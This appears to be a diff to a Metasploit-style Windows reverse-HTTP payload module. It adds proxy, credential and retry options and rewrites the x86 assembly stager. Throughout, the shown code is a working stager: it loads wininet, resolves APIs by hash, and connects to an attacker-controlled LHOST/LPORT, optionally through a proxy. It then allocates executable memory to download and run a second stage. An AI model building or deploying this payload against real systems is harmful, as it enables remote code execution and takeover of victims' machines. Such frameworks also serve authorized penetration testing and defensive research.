@@ -27,7 +27,13 @@ module Payload::Windows::ReverseHttp
     super
     register_advanced_options(
       [
-        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (at least 5 bytes)'])
+        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
+        OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
+        OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
+        OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
+        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
       ], self.class)
   end
 
@@ -41,7 +47,8 @@ module Payload::Windows::ReverseHttp
         ssl:  false,
         host: datastore['LHOST'],
         port: datastore['LPORT'],
-        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW))
+        url:  generate_small_uri,
+        retry_count: datastore['StagerRetryCount'])
     end
 
     conf = {
@@ -49,7 +56,13 @@ module Payload::Windows::ReverseHttp
       host: datastore['LHOST'],
       port: datastore['LPORT'],
       url:  generate_uri,
-      exitfunk: datastore['EXITFUNC']
+      exitfunk: datastore['EXITFUNC'],
+      proxy_host: datastore['PayloadProxyHost'],
+      proxy_port: datastore['PayloadProxyPort'],
+      proxy_user: datastore['PayloadProxyUser'],
+      proxy_pass: datastore['PayloadProxyPass'],
+      proxy_type: datastore['PayloadProxyType'],
+      retry_count: datastore['StagerRetryCount']
     }
 
     generate_reverse_http(conf)
@@ -75,7 +88,7 @@ module Payload::Windows::ReverseHttp
   #
   def generate_uri
 
-    uri_req_len = datastore['HTTPStagerURILength'].to_i
+    uri_req_len = datastore['StagerURILength'].to_i
 
     # Choose a random URI length between 30 and 255 bytes
     if uri_req_len == 0
@@ -83,7 +96,7 @@ module Payload::Windows::ReverseHttp
     end
 
     if uri_req_len < 5
-      raise ArgumentError, "Minimum HTTPStagerURILength is 5"
+      raise ArgumentError, "Minimum StagerURILength is 5"
     end
 
     "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
@@ -112,23 +125,49 @@ module Payload::Windows::ReverseHttp
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+    # Proxy options?
+    space += 200
+
     # The final estimated size
     space
   end
 
   #
-  # Dynamic payload generation
+  # Generate an assembly stub with the configured feature set and options.
+  #
+  # @option opts [Bool] :ssl Whether or not to enable SSL
+  # @option opts [String] :url The URI to request during staging
+  # @option opts [String] :host The host to connect to
+  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String] :proxy_host The optional proxy server host to use
+  # @option opts [Fixnum] :proxy_port The optional proxy server port to use
+  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
+  # @option opts [String] :proxy_user The optional proxy server username
+  # @option opts [String] :proxy_pass The optional proxy server password
+  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
   #
   def asm_reverse_http(opts={})
 
-    #
-    # options should contain:
-    #    ssl:     (true|false)
-    #    url:     "/url_to_request"
-    #   host:     [hostname]
-    #   port:     [port]
-    # exitfunk:   [process|thread|seh|sleep]
-    #
+    retry_count   = [opts[:retry_count].to_i, 1].max
+    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
+    proxy_info    = ""
+
+    if proxy_enabled
+      if opts[:proxy_type].to_s.downcase == "socks"
+        proxy_info << "socks="
+      else
+        proxy_info << "http://"
+      end
+
+      proxy_info << opts[:proxy_host].to_s
+      if opts[:proxy_port].to_i > 0
+        proxy_info << ":#{opts[:proxy_port]}"
+      end
+    end
+
+    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
+    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
 
     http_open_flags = 0
 
@@ -153,14 +192,11 @@ module Payload::Windows::ReverseHttp
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
-      ; Author: HD Moore
-      ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
+      ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
-      ; Version: 1.0
       ;-----------------------------------------------------------------------------;
 
       ; Input: EBP must be the address of 'api_call'.
-      ; Output: EDI will be the socket for the connection to the server
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -168,52 +204,107 @@ module Payload::Windows::ReverseHttp
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
+        xor ebx, ebx           ; Set ebx to NULL to use in future arguments
+      ^
 
-      set_retry:
-        push.i8 8              ; retry 8 times should be enough
-        pop edi
-        xor ebx, ebx           ; push 8 zeros ([1]-[8])
-        mov ecx, edi
-      push_zeros:
-        push ebx
-        loop push_zeros
+    if proxy_enabled
+      asm << %Q^
+        internetopen:
+          push ebx               ; DWORD dwFlags
+          push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+        call get_proxy_server
+          db "#{proxy_info}", 0x00
+        get_proxy_server:
+                                 ; LPCTSTR lpszProxyName (via call)
+          push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
+          push ebx               ; LPCTSTR lpszAgent (NULL)
+          push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+          call ebp
+        ^
+    else
+      asm << %Q^
+        internetopen:
+          push ebx               ; DWORD dwFlags
+          push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+          push ebx               ; LPCTSTR lpszProxyName (NULL)
+          push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+          push ebx               ; LPCTSTR lpszAgent (NULL)
+          push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+          call ebp
+        ^
+    end
 
-      internetopen:
-                               ; DWORD dwFlags [1]
-                               ; LPCTSTR lpszProxyBypass (NULL) [2]
-                               ; LPCTSTR lpszProxyName (NULL) [3]
-                               ; DWORD dwAccessType (PRECONFIG = 0) [4]
-                               ; LPCTSTR lpszAgent (NULL) [5]
-        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
-        call ebp
-
+    asm << %Q^
       internetconnect:
-                               ; DWORD_PTR dwContext (NULL) [6]
-                               ; dwFlags [7]
-        push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
+        push ebx               ; DWORD_PTR dwContext (NULL)
+        push ebx               ; dwFlags
+        push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
-      server_uri:              ;  server_host; server_uri is saved in EDI for later
+      server_uri:              ; server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
-        push eax               ; HINTERNET hInternet
+        push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
         push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
         call ebp
+        mov esi, eax           ; Store hConnection in esi
+      ^
 
+    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
+    # doesn't set the Proxy-Authorization header on the CONNECT request.
+
+    if proxy_enabled && proxy_user
+      asm << %Q^
+          ; DWORD dwBufferLength (length of username)
+          push #{proxy_user.length}
+          call set_proxy_username
+        proxy_username:
+          db "#{proxy_user}",0x00
+        set_proxy_username:
+                               ; LPVOID lpBuffer (username from previous call)
+          push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+          push esi             ; hConnection
+          push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+          call ebp
+        ^
+    end
+
+    if proxy_enabled && proxy_pass
+      asm << %Q^
+          ; DWORD dwBufferLength (length of password)
+          push #{proxy_pass.length}
+          call set_proxy_password
+        proxy_password:
+          db "#{proxy_pass}",0x00
+        set_proxy_password:
+                               ; LPVOID lpBuffer (password from previous call)
+          push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+          push esi             ; hConnection
+          push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+          call ebp
+        ^
+    end
+
+    asm << %Q^
       httpopenrequest:
-                               ; dwContext (NULL) [8]
+        push ebx               ; dwContext (NULL)
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
-        push eax               ; hConnection
+        push esi               ; hConnection
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
+
+      ; Store our retry counter in the edi register
+      set_retry:
+        push #{retry_count}
+        pop edi
 
       send_request:
       ^
@@ -229,9 +320,9 @@ module Payload::Windows::ReverseHttp
             ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
             ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
           mov eax, esp
-          push.i8 4              ; sizeof(dwFlags)
+          push 4                 ; sizeof(dwFlags)
           push eax               ; &dwFlags
-          push.i8 31             ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+          push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
           push esi               ; hHttpRequest
           push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
           call ebp
@@ -272,7 +363,7 @@ module Payload::Windows::ReverseHttp
 
       asm << %Q^
         allocate_memory:
-          push.i8 0x40           ; PAGE_EXECUTE_READWRITE
+          push 0x40              ; PAGE_EXECUTE_READWRITE
           push 0x1000            ; MEM_COMMIT
           push 0x00400000        ; Stage allocation (4Mb ought to do us)
           push ebx               ; NULL as we dont care where the allocation is
